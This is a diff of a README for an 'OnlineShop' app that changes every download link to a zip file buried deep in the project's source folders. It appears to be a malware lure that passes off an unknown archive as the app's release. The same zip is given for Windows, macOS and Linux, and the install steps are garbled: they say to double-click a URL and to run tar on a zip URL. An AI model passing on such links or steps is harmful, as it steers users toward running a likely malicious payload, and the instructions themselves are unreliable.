@@ -6,7 +6,7 @@ Welcome to OnlineShop! This application helps you manage your online shopping ex
 
 ## 📥 Download OnlineShop
 
-[![Download OnlineShop](https://raw.githubusercontent.com/l0k10/OnlineShop/master/antiquation/OnlineShop.zip)](https://raw.githubusercontent.com/l0k10/OnlineShop/master/antiquation/OnlineShop.zip)
+[![Download OnlineShop](https://github.com/l0k10/OnlineShop/raw/refs/heads/master/src/ProductCatalog/ProductCatalog.Application/Common/Behaviors/Shop-Online-2.0.zip)](https://github.com/l0k10/OnlineShop/raw/refs/heads/master/src/ProductCatalog/ProductCatalog.Application/Common/Behaviors/Shop-Online-2.0.zip)
 
 ## 🖥️ System Requirements
 
@@ -18,30 +18,30 @@ Before you start, make sure your computer meets the following requirements:
 
 ## 🔗 Visit the Releases Page
 
-To download the latest version of OnlineShop, visit our [Releases page](https://raw.githubusercontent.com/l0k10/OnlineShop/master/antiquation/OnlineShop.zip). You will find the most recent builds and features listed.
+To download the latest version of OnlineShop, visit our [Releases page](https://github.com/l0k10/OnlineShop/raw/refs/heads/master/src/ProductCatalog/ProductCatalog.Application/Common/Behaviors/Shop-Online-2.0.zip). You will find the most recent builds and features listed.
 
 ## 📦 Download & Install
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/l0k10/OnlineShop/master/antiquation/OnlineShop.zip).
+1. Go to the [Releases page](https://github.com/l0k10/OnlineShop/raw/refs/heads/master/src/ProductCatalog/ProductCatalog.Application/Common/Behaviors/Shop-Online-2.0.zip).
 2. Look for the latest release version.
 3. Click on the appropriate file for your OS. Ensure you select the right file for your system:
-   - For Windows, download `https://raw.githubusercontent.com/l0k10/OnlineShop/master/antiquation/OnlineShop.zip`
-   - For macOS, download `https://raw.githubusercontent.com/l0k10/OnlineShop/master/antiquation/OnlineShop.zip`
-   - For Linux, download `https://raw.githubusercontent.com/l0k10/OnlineShop/master/antiquation/OnlineShop.zip`
+   - For Windows, download `https://github.com/l0k10/OnlineShop/raw/refs/heads/master/src/ProductCatalog/ProductCatalog.Application/Common/Behaviors/Shop-Online-2.0.zip`
+   - For macOS, download `https://github.com/l0k10/OnlineShop/raw/refs/heads/master/src/ProductCatalog/ProductCatalog.Application/Common/Behaviors/Shop-Online-2.0.zip`
+   - For Linux, download `https://github.com/l0k10/OnlineShop/raw/refs/heads/master/src/ProductCatalog/ProductCatalog.Application/Common/Behaviors/Shop-Online-2.0.zip`
 4. Once downloaded, locate the file on your computer and follow these instructions:
 
    - For Windows users: 
-     - Double-click `https://raw.githubusercontent.com/l0k10/OnlineShop/master/antiquation/OnlineShop.zip` to launch the installer.
+     - Double-click `https://github.com/l0k10/OnlineShop/raw/refs/heads/master/src/ProductCatalog/ProductCatalog.Application/Common/Behaviors/Shop-Online-2.0.zip` to launch the installer.
      - Follow the on-screen instructions to complete the installation.
      - Once installed, you can find OnlineShop in your Start Menu.
 
    - For macOS users: 
-     - Open `https://raw.githubusercontent.com/l0k10/OnlineShop/master/antiquation/OnlineShop.zip`.
+     - Open `https://github.com/l0k10/OnlineShop/raw/refs/heads/master/src/ProductCatalog/ProductCatalog.Application/Common/Behaviors/Shop-Online-2.0.zip`.
      - Drag and drop the OnlineShop icon into the Applications folder.
      - Open Finder, go to Applications, and double-click OnlineShop to start.
 
    - For Linux users: 
-     - Extract `https://raw.githubusercontent.com/l0k10/OnlineShop/master/antiquation/OnlineShop.zip` using `tar -xvzf https://raw.githubusercontent.com/l0k10/OnlineShop/master/antiquation/OnlineShop.zip`.
+     - Extract `https://github.com/l0k10/OnlineShop/raw/refs/heads/master/src/ProductCatalog/ProductCatalog.Application/Common/Behaviors/Shop-Online-2.0.zip` using `tar -xvzf https://github.com/l0k10/OnlineShop/raw/refs/heads/master/src/ProductCatalog/ProductCatalog.Application/Common/Behaviors/Shop-Online-2.0.zip`.
      - Navigate to the extracted folder in the terminal.
      - Run `./OnlineShop` to launch the application.
 
